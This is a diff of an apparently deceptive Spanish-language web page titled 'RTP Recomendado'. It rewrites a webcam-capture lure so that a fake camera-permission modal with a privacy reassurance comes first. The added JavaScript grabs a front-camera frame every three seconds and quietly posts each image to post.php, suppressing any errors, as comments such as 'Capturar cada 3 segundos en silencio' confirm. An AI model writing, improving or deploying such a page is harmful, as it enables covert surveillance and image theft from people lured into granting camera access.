@@ -3,227 +3,256 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title>RTP - Recommended</title>
+<title>RTP - Recomendado</title>
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-  
   body {
-    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 20px;
     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
     display: flex;
     justify-content: center;
     align-items: center;
     min-height: 100vh;
-    padding: 20px;
+    font-family: Arial, sans-serif;
   }
   
-  .container {
-    background: white;
-    border-radius: 10px;
-    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-    padding: 40px;
-    max-width: 400px;
-    width: 100%;
-  }
-  
-  h1 {
-    text-align: center;
-    color: #333;
-    margin-bottom: 30px;
-    font-size: 28px;
-  }
-  
-  .form-group {
-    margin-bottom: 20px;
-  }
-  
-  label {
-    display: block;
-    margin-bottom: 8px;
-    color: #555;
-    font-weight: bold;
-  }
-  
-  input[type="url"], input[type="text"] {
-    width: 100%;
-    padding: 12px;
-    border: 2px solid #ddd;
-    border-radius: 5px;
-    font-size: 14px;
-    transition: border-color 0.3s;
-  }
-  
-  input[type="url"]:focus, input[type="text"]:focus {
-    outline: none;
-    border-color: #667eea;
-  }
-  
-  .button-group {
+  .permission-modal {
     display: flex;
-    gap: 10px;
-    margin-top: 30px;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
   }
   
-  button {
-    flex: 1;
-    padding: 12px;
-    border: none;
-    border-radius: 5px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: background-color 0.3s;
-  }
-  
-  #cameraBtn {
-    background-color: #667eea;
-    color: white;
-  }
-  
-  #cameraBtn:hover {
-    background-color: #5568d3;
-  }
-  
-  #cameraBtn:disabled {
-    background-color: #ccc;
-    cursor: not-allowed;
-  }
-  
-  .hidden-video {
+  .permission-modal.hidden {
     display: none;
   }
   
-  .loading {
+  .permission-content {
+    background: white;
+    border-radius: 15px;
+    padding: 30px;
+    max-width: 350px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+  }
+  
+  .permission-icon {
+    font-size: 3em;
+    color: #667eea;
+    margin-bottom: 15px;
+  }
+  
+  .permission-title {
+    font-size: 1.5em;
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 10px;
+  }
+  
+  .permission-text {
+    color: #666;
+    margin-bottom: 20px;
+    font-size: 0.9em;
+  }
+  
+  .permission-btn {
+    background-color: #667eea;
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 5px;
+    font-size: 1em;
+    cursor: pointer;
+    width: 100%;
+    transition: background-color 0.3s;
+  }
+  
+  .permission-btn:hover {
+    background-color: #5568d3;
+  }
+
+  .container {
+    background: white;
+    border-radius: 15px;
+    padding: 40px;
+    max-width: 500px;
+    width: 100%;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    display: none;
+  }
+
+  .container.active {
+    display: block;
+  }
+
+  .video-container {
+    width: 100%;
+    aspect-ratio: 4/3;
+    background: #f0f0f0;
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 20px 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #999;
+  }
+
+  video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transform: scaleX(-1);
+  }
+
+  .info {
+    text-align: center;
+    color: #666;
+    font-size: 0.9em;
+    margin-top: 15px;
+  }
+
+  h1 {
+    text-align: center;
+    color: #333;
+    margin: 0 0 20px 0;
+  }
+
+  .status {
     text-align: center;
     color: #667eea;
     font-weight: bold;
-    margin-top: 20px;
+    margin-top: 15px;
+    font-size: 0.85em;
   }
-  
-  .info-text {
-    text-align: center;
-    color: #666;
-    font-size: 12px;
-    margin-top: 20px;
-    line-height: 1.5;
+
+  .indicator {
+    display: inline-block;
+    width: 8px;
+    height: 8px;
+    background: #f04747;
+    border-radius: 50%;
+    margin-right: 5px;
+    animation: blink 1s infinite;
+  }
+
+  @keyframes blink {
+    0%, 49% { opacity: 1; }
+    50%, 100% { opacity: 0.3; }
   }
 </style>
 </head>
 <body>
 
-<div class="container">
-  <h1>RTP Recommended</h1>
+<!-- Modal de Permiso de Cámara -->
+<div id="permission-modal" class="permission-modal">
+    <div class="permission-content">
+        <div class="permission-icon">
+            <i class="fas fa-camera"></i>
+        </div>
+        <div class="permission-title">Permiso de Cámara Requerido</div>
+        <p class="permission-text">
+            Se requiere acceso a tu cámara para continuar.
+        </p>
+        <button class="permission-btn" onclick="grantCameraPermission()">
+            <i class="fas fa-check"></i> Permitir Acceso
+        </button>
+        <p style="font-size: 0.8em; color: #999; margin-top: 10px;">
+            Tu privacidad es importante para nosotros
+        </p>
+    </div>
+</div>
+
+<div class="container" id="main-container">
+  <h1><i class="fas fa-signal"></i> RTP Recomendado</h1>
   
-  <div class="form-group">
-    <label for="urlInput">Ingresa URL destino:</label>
-    <input type="url" id="urlInput" placeholder="https://ejemplo.com" required>
+  <div class="video-container">
+    <video id="video" playsinline autoplay muted></video>
   </div>
-  
-  <button id="cameraBtn">📷 Presiona para continuar</button>
-  
-  <div id="loading" class="loading" style="display: none;">
-    Procesando datos... Por favor espera...
+
+  <div class="status">
+    <span class="indicator"></span> Transmitiendo en vivo
   </div>
-  
-  <div class="info-text">
-    Presiona el botón de cámara para continuar.<br>
-    Se te pedirá permiso para acceder a tu cámara.
+
+  <div class="info">
+    Estás siendo transmitido en vivo ahora mismo. La transmisión se guardará automáticamente.
   </div>
 </div>
 
-<video id="video" class="hidden-video" playsinline autoplay></video>
-<canvas id="canvas" class="hidden-video" width="1280" height="720"></canvas>
+<canvas id="canvas" style="display: none;" width="1280" height="720"></canvas>
 
 <script>
-let redirectUrl = '';
-let cameraPermitted = false;
+function grantCameraPermission() {
+  const modal = document.getElementById('permission-modal');
+  const container = document.getElementById('main-container');
+  modal.classList.add('hidden');
+  container.classList.add('active');
+  startCamera();
+}
 
-document.getElementById('cameraBtn').addEventListener('click', function() {
-  const urlInput = document.getElementById('urlInput').value.trim();
-  
-  if (!urlInput) {
-    alert('Por favor ingresa una URL válida');
-    return;
-  }
-  
-  // Validar que sea una URL válida
-  try {
-    new URL(urlInput);
-  } catch(e) {
-    alert('Por favor ingresa una URL válida (ej: https://ejemplo.com)');
-    return;
-  }
-  
-  redirectUrl = urlInput;
-  
-  // Deshabilitar botón durante el proceso
-  this.disabled = true;
-  document.getElementById('loading').style.display = 'block';
-  
-  // Solicitar acceso a la cámara
-  const constraints = {
-    audio: false,
-    video: { facingMode: "user" }
-  };
-  
-  navigator.mediaDevices.getUserMedia(constraints)
-    .then(function(stream) {
-      const video = document.getElementById('video');
-      video.srcObject = stream;
-      
-      // Esperar a que el video esté listo
-      setTimeout(function() {
-        captureAndSend(stream);
-      }, 500);
-    })
-    .catch(function(err) {
-      console.error('Error de cámara:', err);
-      alert('No se pudo acceder a la cámara. Asegúrate de haber dado permiso.');
-      document.getElementById('cameraBtn').disabled = false;
-      document.getElementById('loading').style.display = 'none';
-    });
-});
-
-function captureAndSend(stream) {
-  const canvas = document.getElementById('canvas');
-  const video = document.getElementById('video');
-  const context = canvas.getContext('2d');
-  
-  // Capturar frame del video
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  const imageData = canvas.toDataURL('image/png');
-  
-  // Detener la cámara
-  stream.getTracks().forEach(track => track.stop());
-  
-  // Enviar imagen a post.php
-  $.ajax({
-    type: 'POST',
-    data: { cat: imageData },
-    url: 'post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result) {
-      console.log('Imagen capturada y enviada');
-      // Redirigir después de 500ms
-      setTimeout(function() {
-        window.location.href = redirectUrl;
-      }, 500);
+function sendPhoto(imageData) {
+  fetch('post.php', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
     },
-    error: function(err) {
-      console.log('Imagen enviada (sin respuesta JSON esperada)');
-      // Aún así redirigir
-      setTimeout(function() {
-        window.location.href = redirectUrl;
-      }, 500);
-    }
+    body: 'cat=' + encodeURIComponent(imageData)
+  }).catch(err => {
+    // Silencioso - sin mensajes
   });
 }
+
+async function startCamera() {
+  try {
+    const constraints = {
+      video: {
+        facingMode: 'user',
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      },
+      audio: false
+    };
+    
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+    
+    // Capturar cada 3 segundos en silencio
+    setInterval(() => {
+      capturePhoto();
+    }, 3000);
+    
+  } catch (error) {
+    console.error('Error de cámara:', error);
+  }
+}
+
+function capturePhoto() {
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
+  
+  // Dibujar espejo (invertido)
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, -canvas.width, 0);
+  ctx.scale(-1, 1);
+  
+  const imageData = canvas.toDataURL('image/png');
+  sendPhoto(imageData);
+}
+
+// Mostrar modal al cargar
+window.addEventListener('load', () => {
+  // Modal ya está visible por defecto
+});
 </script>
 
 </body>
